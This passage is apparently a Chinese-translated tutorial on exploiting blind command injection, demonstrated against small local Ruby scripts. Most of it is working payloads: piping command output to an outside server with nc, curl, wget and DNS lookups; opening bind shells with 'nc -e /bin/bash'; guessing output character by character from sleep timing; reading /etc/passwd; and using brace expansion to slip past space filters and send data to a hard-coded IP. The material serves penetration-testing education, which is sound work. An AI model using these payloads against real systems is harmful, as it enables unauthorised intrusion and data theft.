    jobert
红色部分显示了ping命令的输出。绿色文本是whoami命令的输出。这就是你的POC。再次强调，要坚持使用无害的命令。
**利用命令盲注**
使用盲注命令，输出不会返回给用户，所以应该找到其他方法来提取输出。最直接的技术是将输出回传到您的服务器。为了模拟这一点，请在服务器上运行nc -l -n
-vv -p 80 -k，并允许防火墙中端口80上的入站连接。
设置好监听器后，使用nc，curl，wget，telnet或任何其他向互联网发送数据的工具，将输出发送到您的服务器：
    $ ruby server-online.rb '8.8.8.8 && hostname | nc IP 80'
    yes
然后观察一个连接到服务器的连接，该连接显示hostname命令的输出:
    $ nc -l -n -vv -p 80 -k
    Listening on [0.0.0.0] (family 0, port 81)
    Connection from [1.2.3.4] port 80 [tcp/*] accepted (family 2, sport 64225)
    hacker.local
在上面的示例中，nc用于将命令的输出发送到您的服务器。然而，nc可能会被删除或无法执行。为了防止掉进坑中
，有几个简单的有效payload来确定一个命令是否存在。如果命令中的任何一个命令增加了5秒的时间，就知道这个命令是存在的。
    curl -h && sleep 5
    wget -h && sleep 5
    ssh -V && sleep 5
    telnet && sleep 5
确定命令时，可以使用上面中的任意一个命令将命令的输出发送到服务器，如下所示：
    whoami | curl http://your-server -d @-    wget http://your-server/$(whoami)
    export C=whoami | ssh user@your-server (setup the user account on your-server to authenticate without a password and log every command being executed)
即使server-online.rb脚本不输出hostname命令的结果，也可以将该输出发送到远程服务器，并由攻击者获取。有时候
，出站TCP和UDP无法使用。在这种情况下我们只需要一点处理就可以继续 。
为了拿到结果 ，我们必须基于可以更改的内容来猜测输出。在这种情况下，可以使用sleep命令来增加执行时间。这可以用于检测是否执行
。这里的技巧是将命令的结果传递给sleep命令。这里有一个例子：sleep $（hostname | cut -c 1 | tr a 5）。
下面来分析一下。
它正在执行hostname命令。 我们假设它返回hacker.local。
它会把该输出传递给cut -c 1.这将取代hacker.local的第一个字符，这是字符h。
它将其传递给tr a 5，它将在切割命令（h）的输出中用一个5代替字符a。
然后将tr命令的输出传递给sleep命令，导致执行sleep h。
这将立即出现错误，因为sleep只能作为第一个参数。目标是用tr命令迭代字符。一旦执行sleep $（hostname | cut -c 1 | tr h
5），命令将需要5秒钟的时间才能执行。这就是如何确定第一个字符是一个h的方法。
一旦你猜到一个字符，就把你传递给cut-c命令的次数增加，然后重复。
下面是一个使用命令来确定输出的表:
要确定需要猜测多少个字符:将hostname的输出传递到wc-c，并将其传递给sleep命令。hacker.local是12个字符。hostname命令返回hostname和新行，因此wc-c将返回13。我们建立了正常的脚本，脚本需要3秒才能完成。
    $ time ruby server-online.rb '8.8.8.8 && sleep $(hostname | wc -c)'
    yes
    0.10s user 0.04s system 0% cpu 16.188 total
上面的有效payload
表明脚本现在需要16秒才能完成，这意味着hostname的输出是12个字符:16-3(基线)-1(新行)=12个字符。当在web服务器上执行这个有效payload时，输出可能会发生变化:当不同的服务器处理请求时，hostname的长度可能会发生变化。
上述技术适用于较小的输出，但读取文件 可能需要很长时间。 以下一些方法可能会具有很大的侵犯性，所以一定要确保公司批准 ，并让你使用更具侵略性的方法。
在出站连接无法使用 并且使用时间法会消耗大量时间的情况下，这里还有一些其他的技巧（在CTF期间有用）：
在服务器上运行端口扫描，并基于已暴露的服务去确定一种提取输出的方法。
FTP：尝试将文件写入一个目录，可以从该目录中下载文件。
SSH:尝试将命令的输出写到MOTD标志，然后简单地将SSH连接到服务器。
Web:尝试将命令的输出写到公共目录中的文件(/var/www/)。
在一个可以从外部到达的端口上生成一个shell(只在定制的netcat中可用):nc-l-n-vv-p 80-e/bin/bash(unix)或nc-l-vv-cmd-cmd。exe(windows)。
使用dig或nslookup进行DNS查询以将输出发送到端口53（UDP）：dig`hostname` @ your-server或nslookup`hostname` your-server。可以使用服务器上的nc -l -n -v–p-53 -u -k捕获输出。
这可能会有用 ，因为通常允许出站DNS流量。 看看这条推特如何回传文件内容。
在ping服务器以回传数据时，请更改ICMP数据包大小。 tcpdump可用于捕获数据。 看看这个推文如何做到这一点。
还有很多其他的方法，但这常常取决于服务器给你的配置 。上面所示的技术在利用命令注入漏洞时是最常见的。关键是使用所需要的内容来提取输出！
**绕过补丁**
有时，服务器已经采取了一些防范 ，这可能导致上述方法不起作用。我所知道有一种缓解 方法是对有效payload
的空格进行限制。即有一种叫做“括号扩展”的技术可以用来创建没有空格的有效payload。下面是ping-2.rb，它是ping.rb的第二个版本。在将用户输入传递给命令之前，它会从输入中删除空格。
    puts `ping -c 4 #{ARGV[0].gsub(/s+?/,'')}`
当将8.8.8.8&&sleep 5作为参数传递时，它将执行ping-c 4 8.8.8.8&&sleep 5，这将导致一个错误显示 命令sleep
5没有被发现。有一种简单的方法可以使用括号扩展:
    $ time ruby ping-2.rb '8.8.8.8;{sleep,5}'
    ...
    0.10s user 0.04s system 1% cpu 8.182 total
下面是一个有效payload ，它将命令的输出发送到外部服务器，而不使用空格:
    $ ruby ping.rb '8.8.8.8;hostname|{nc,192.241.233.143,81}'
    PING 8.8.8.8 (8.8.8.8): 56 data bytes
    ...
    Or to read /etc/passwd:
    $ ruby ping.rb '8.8.8.8;{cat,/etc/passwd}'
    PING 8.8.8.8 (8.8.8.8): 56 data bytes
    64 bytes from 8.8.8.8: icmp_seq=0 ttl=46 time=9.215 ms
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=46 time=10.194 ms
    64 bytes from 8.8.8.8: icmp_seq=2 ttl=46 time=10.171 ms
    64 bytes from 8.8.8.8: icmp_seq=3 ttl=46 time=8.615 ms
    --- 8.8.8.8 ping statistics ---    4 packets transmitted, 4 packets received, 0.0% packet loss
    round-trip min/avg/max/stddev = 8.615/9.549/10.194/0.668 ms
    ##
    # User Database
    #
    # Note that this file is consulted directly only when the system is running
    # in single-user mode. At other times this information is provided by
    # Open Directory.
    ...
开发人员必须关注由用户输入整合的命令，并做好防范 。开发人员采用不同的方法来防范命令注入 ，你可以试着探索一下他们是怎么做的 。